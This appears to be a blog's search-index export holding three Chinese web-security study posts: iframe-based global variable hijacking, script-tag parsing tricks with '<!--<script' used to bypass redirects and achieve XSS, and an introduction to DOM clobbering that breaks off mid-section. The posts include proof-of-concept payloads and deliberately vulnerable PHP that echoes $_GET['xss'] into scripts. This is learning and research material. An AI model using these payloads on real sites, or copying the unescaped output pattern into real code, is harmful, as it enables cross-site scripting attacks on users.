<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>前端全局变量劫持</title>
    <url>/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>关于前段变量劫持的一些学习与思考</p>
<a id="more"></a>


<h3 id="iframe之间的访问与同源关系"><a href="#iframe之间的访问与同源关系" class="headerlink" title="iframe之间的访问与同源关系"></a>iframe之间的访问与同源关系</h3><h4 id="父页面访问子页面"><a href="#父页面访问子页面" class="headerlink" title="父页面访问子页面"></a>父页面访问子页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).contentWindow; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>[<span class="number">0</span>] ; <span class="comment">// 这个比较有意思， window 是本页面的window对象，window[0] 是子页面的window对象</span></span><br></pre></td></tr></table></figure>

<h4 id="子页面访问父页面"><a href="#子页面访问父页面" class="headerlink" title="子页面访问父页面"></a>子页面访问父页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent;  <span class="comment">//获取上一级的window对象，如果还是iframe则是该iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.top ;   <span class="comment">// 获取最顶级容器的window对象，即，就是你打开页面的文档</span></span><br></pre></td></tr></table></figure>

<h4 id="location与frame"><a href="#location与frame" class="headerlink" title="location与frame"></a>location与frame</h4><p>如果父和子页面是同源的，那么可以通过这个window对象获取到任何你想获取的内容，包括但是不限于 document,name,location 等。但是在非同源的情况下，iframe的window对象大多数的属性都会被同源策略block掉，但是有两个属性比较特殊。</p>
<ol>
<li>frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象</li>
<li>location 可写，但是不可读。意味着父子可以相互修改彼此的 location</li>
</ol>
<p>上述内容摘自wonderkun师傅博客（</p>
<h4 id="iframe同源跨域问题"><a href="#iframe同源跨域问题" class="headerlink" title="iframe同源跨域问题"></a>iframe同源跨域问题</h4><p>iframe所加载的子页面会被同源限制，所以无法对引入进来的iframe中的元素进行操作：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//localhost/JQuery Test/exp.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">'http://localhost/JQuery test/2.html'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/05/GD3Udx.png" alt="GD3Udx.png"></p>
<p>从上面的例子可以看出我们可以通过location进行同源设置来避免因为同源而被Block的情况，可成功获取name属性。</p>
<h3 id="name属性与id属性"><a href="#name属性与id属性" class="headerlink" title="name属性与id属性"></a>name属性与id属性</h3><p>name属性和id属性都可以注册为全局变量，如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDt4MD.png" alt="GDt4MD.png"></p>
<h4 id="不可覆盖变量性"><a href="#不可覆盖变量性" class="headerlink" title="不可覆盖变量性"></a>不可覆盖变量性</h4><p>对于由id和name属性创建的变量 不可对已声明的变量进行覆盖 示例如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDd0YR.png" alt="GDd0YR.png"></p>
<p>可以看到实际的变量并没有覆盖，所以对于这种攻击手法我们需要的是一个未定义的变量的。</p>
<p>、关于更多name和id属性的特性在下一篇Dom Clobbering再说吧。</p>
<h3 id="如何获得未定义的变量"><a href="#如何获得未定义的变量" class="headerlink" title="如何获得未定义的变量"></a>如何获得未定义的变量</h3><p>从上面的内容我们可以得知我们的攻击时进行的操作必须要在此变量未定义的情况下进行（因为我们通过id或name属性无法对已定义的变量进行覆盖）。</p>
<p>利用XSS-Auditor进行变量删除（不过需要注意的时XSS-Auditor在Chrome-78beta版本已经被废除)</p>
<p>利用方式：</p>
<p>通过参数提交恶意语句，即可进行删除变量，如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xss&#x3D;&lt;script&gt;var lih3iu&#x3D;1&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>父页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://A.com/index.html"</span>; <span class="comment">// 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block</span></span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'setting viewer...'</span>);</span></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].name = <span class="string">"lih3iu"</span>; <span class="comment">// 重新定义全局变量</span></span></span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E</span></span><br><span class="line"><span class="comment">    利用chrome的filter模式去掉 VUL 的定义 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B.com/B.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://www.baidu.com"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"exploit()"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> test1=<span class="number">1</span>;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> lih3iu = <span class="string">"Hijack me"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(lih3iu);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到lih3iu变量被成功设置为一个window变量，这也是这个漏洞的局限性，只可将漏洞劫持为一个window变量，对于这个漏洞其实还是有一些问题的（比如一些同源跨域的问题，有兴趣的师傅可以私我一起讨论一下）</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GrePh9.png" alt="GrePh9.png"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞/#more" target="_blank" rel="noopener">http://wonderkun.cc/2019/07/01/%E5%89%8D%E7%AB%AF%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/#more</a></p>
<p><a href="https://hpdoger.cn/2019/07/02/前端全局变量劫持/" target="_blank" rel="noopener">https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</a></p>
]]></content>
      <tags>
        <tag>Variable hijacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript中变量声明带来的Tags Broken</title>
    <url>/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/</url>
    <content><![CDATA[<h3 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h3><p>问题代码如下</p>
<a id="more"></a>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://s1.ax1x.com/2020/04/08/GW8xXt.png" alt="GW8xXt.png"></p>
<p>看一下会造成的影响</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWGI3j.png" alt="GWGI3j.png"></p>
<p>很明显可见的是img标签以及下面的html全部被吃掉了</p>
<h3 id="原因探讨以及不同场景下的fuzz"><a href="#原因探讨以及不同场景下的fuzz" class="headerlink" title="原因探讨以及不同场景下的fuzz"></a>原因探讨以及不同场景下的fuzz</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>官方文档给出的解释如下：</p>
<blockquote>
<p>由于遗留原因，HTML元素中的“ <code>&lt;!--</code>”和“ <code>&lt;script</code>”字符串<code>script</code>需要进行平衡，以便解析器考虑关闭该块</p>
</blockquote>
<p>也就是说在<code>&lt;!--</code>的作用下<code>&lt;script&gt;</code>是要去和下面的<code>&lt;/script&gt;</code>闭合的，而<code>&lt;!--</code>的作用仍然是充当注释符作用，虽然<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>进行了闭合，但是因为注释符的原因，里面的内容并不会被解析</p>
<h4 id="注释状态下的其他语句解析"><a href="#注释状态下的其他语句解析" class="headerlink" title="注释状态下的其他语句解析"></a>注释状态下的其他语句解析</h4><p>通过测试发现这种注释语句还会带来标签内语句无法解析的效果</p>
<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=alert(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然最后alert(1)也在script标签内 ，但是无法执行</p>
<p><img src="https://s1.ax1x.com/2020/04/09/G4XMqK.png" alt="G4XMqK.png"></p>
<h4 id="不同场景下的fuzz"><a href="#不同场景下的fuzz" class="headerlink" title="不同场景下的fuzz"></a>不同场景下的fuzz</h4><h5 id="标签的fuzz"><a href="#标签的fuzz" class="headerlink" title="标签的fuzz"></a>标签的fuzz</h5><p>这里主要是不同标签能否产生类似script这样的闭合进行的fuzz，结果发现，似乎只有具备script这样特性的标签才可以产生这样的效果。</p>
<p>并且必须要&lt;!–与<code>&lt;script&gt;</code>进行结合搭配才可以产生这样的效果，在只有&lt;!–和<code>&lt;script&gt;</code>的情况下都无法产生预期的结果</p>
<p>这里对为什么必须要二者结合在一起才能产生这样的效果进行了一个猜想：</p>
<p>在如下代码情况下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;!--</code>并未起到注释的效果可能是因为被变量的字符串作用域所限制，使得他只能是一个普通的字符串，而在如下的代码情况下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--&lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>的闭合导致后面的单引号失去了原本的作用，而&lt;!–也发挥了他本身的作用，所以最终导致的后果就是，红框里的内容全部当作了注释</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWWXCQ.png" alt="GWWXCQ.png"></p>
<p>需要注意的是：在这种情况下<code>&lt;script&gt;</code>里面的代码是完全无效的</p>
<p>探讨：</p>
<p>在测试完标签后发现了同样比较有趣的一点是如果我们直接在变量中声明<code>&lt;/script&gt;</code>，测试代码与效果如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line">        console.log(example);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/08/GW4KhD.png" alt="GW4KhD.png"></p>
<p>可以发现如果在变量中直接声明<code>&lt;/script&gt;</code>的话会直接和前面的<code>&lt;script&gt;</code>进了闭合，把单引号以及之后的内容都扔到了后面，产生了直接使后面代码无效化的影响</p>
<h4 id="字符串场景下的利用"><a href="#字符串场景下的利用" class="headerlink" title="字符串场景下的利用"></a>字符串场景下的利用</h4><p>漏洞利用场景如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload='<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>';</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.google.com"</span>;</span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于这个页面的效果是在1000ms后自动跳转到谷歌，不过我们可以变量的设置来bypass这个跳转</p>
<p>实现如下：<br><img src="https://s1.ax1x.com/2020/04/08/Gf3bcR.png" alt="Gf3bcR.png"></p>
<h4 id="非字符串场景下的利用"><a href="#非字符串场景下的利用" class="headerlink" title="非字符串场景下的利用"></a>非字符串场景下的利用</h4><h5 id="非字符串下变量声明中-lt-–产生的问题"><a href="#非字符串下变量声明中-lt-–产生的问题" class="headerlink" title="非字符串下变量声明中&lt;!–产生的问题"></a>非字符串下变量声明中&lt;!–产生的问题</h5><p>如果对一个变量直接用如下方式赋值（在控制台）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a&#x3D;&lt;!--</span><br></pre></td></tr></table></figure>

<p>将一直处于输入状态</p>
<p>对于这个情况，可以前面一些字符或者数字进行避免</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a&#x3D;1&lt;!--</span><br></pre></td></tr></table></figure>

<p>最终a的值为1</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=<span class="number">1</span>&lt;!--;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> b=<span class="number">2</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上js可正常执行</p>
<h5 id="应用场景探讨"><a href="#应用场景探讨" class="headerlink" title="应用场景探讨"></a>应用场景探讨</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.baidu.com"</span></span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用方式其实差不多</p>
<ul>
<li>在没有分号的情况的下可以用：<code>xss=&lt;!--&lt;script或者&lt;!--&lt;script&gt;</code></li>
<li>在有分号限制的情况下只有：<code>xss=&lt;!--&lt;script&gt;</code></li>
</ul>
<h5 id="进一步探讨"><a href="#进一步探讨" class="headerlink" title="进一步探讨"></a>进一步探讨</h5><p>在另一种结构下: 如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> location = <span class="string">'http://127.0.0.1'</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        test=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"><span class="actionscript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        return location = '/?a='+<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//normal part</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要做的是不影响下面的正常js语句且能做到xss</p>
<p>而且特别需要注意的是在try中的代码时return location而非location，区别是</p>
<ul>
<li><p>return条件下：return完了之后的语句并不会执行</p>
</li>
<li><p>非return条件下：test和location都会被赋值操作</p>
</li>
</ul>
<p>也就是说非return条件下其实是无难度的xss。</p>
<p>这里我们采用的是<code>&lt;!--&lt;script</code>去闭合而非<code>&lt;!--&lt;script&gt;</code>，后者产生的注释直接会将后面的所有全部注释掉，无法再满足正常的js结构，并且此注释状态不可取消掉。</p>
<p>前者只会把script标签内的部分注释掉（因为没有闭合），并且可以通过特定语句来取消掉注释状态，所以我们现在可以传参<code>a=alert(1);&lt;!--script</code>，这样会符合正常的语句，但会直接location掉，所以我们再重新声明下location，再给一个报错就可以了</p>
<p>最终payload</p>
<p><img src="https://i.loli.net/2020/04/09/wj7HbMp8i4GDL9s.png" alt="TIM截图20200409160838.png"></p>
]]></content>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM Clobbering Attack</title>
    <url>/2020/04/15/DOM-Clobbering-Attack/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>介绍一种很有趣的攻击手法：DOM Clobbering Attack</p>
<a id="more"></a>

<h3 id="Dom-Clobbering-Attack概述"><a href="#Dom-Clobbering-Attack概述" class="headerlink" title="Dom Clobbering Attack概述"></a>Dom Clobbering Attack概述</h3><p>大概简述下这个技术的主要攻击手法：</p>
<p>通过标签中定义的name和id属性进行全局变量覆盖或劫持，进而造成其他通过全局变量实现效果的代码出现可控情况，造成漏洞。</p>
<h4 id="简单了解下id与name"><a href="#简单了解下id与name" class="headerlink" title="简单了解下id与name"></a>简单了解下id与name</h4><p><img src="https://s1.ax1x.com/2020/04/12/GO03h6.png" alt="GO03h6.png"></p>
<p>通过这种方式我们实现了全局变量的声明，不过有一点需要注意的是id无法通过document来获取，不过可以通过document.getElementById(‘test1’)或者document.querySelector(‘test1’)进行获取.</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="字符串的强制转换"><a href="#字符串的强制转换" class="headerlink" title="字符串的强制转换"></a>字符串的强制转换</h4><p>在利用时需要考虑两个问题：</p>
<p>第一个问题是：我们通过Dom clobbering覆盖的变量的值均是标签，也就是说都是一个HTMLElement对象，但是在实际应用的时候，很多时候变量都是按照字符串进行操作的，比如上面的例子中，如果直接进行字符串强制类型转换，将会产生下面的结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1)  <span class="comment">//[object HTMLImageElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以说我们需要找到即使被字符串强制类型转换后也能使用的标签，可利用如下代码进行下fuzz</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>

<p>结果为得到HTMLAnchorElement和HTMLAreaElement.也就是对应了a标签和area标签</p>
<p>通过下面代码对这两个标签进行下测试</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">"http://test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">area</span> <span class="attr">id</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"http://test2"</span>&gt;</span><span class="tag">&lt;/<span class="name">area</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1) <span class="comment">// 返回结果http://test1</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test2) <span class="comment">// 返回结果http://test2</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面的测试结果来看a标签和area标签如果进行toString强制转换的时候，是会返回其href属性的value的</p>
<p>这里给下篇文章留个坑吧（可能是一篇关于Spidermonkey分析native code的文章）</p>
<h4 id="属性的访问"><a href="#属性的访问" class="headerlink" title="属性的访问"></a>属性的访问</h4><p>在javascript中属性的访问并不只有简单的x这种，更有a.b，a.b.c，甚至a.b.c.d这种的访问形式，下面的探讨就是对于这样问题的解决</p>
<h5 id="两层访问"><a href="#两层访问" class="headerlink" title="两层访问"></a>两层访问</h5><h6 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h6><p>第一种方法可以通过HTMLCollection的创建来实现两层访问</p>
<p>我们可以通过相同id的标签创建来实现HTMLCollection的创建，如下：</p>
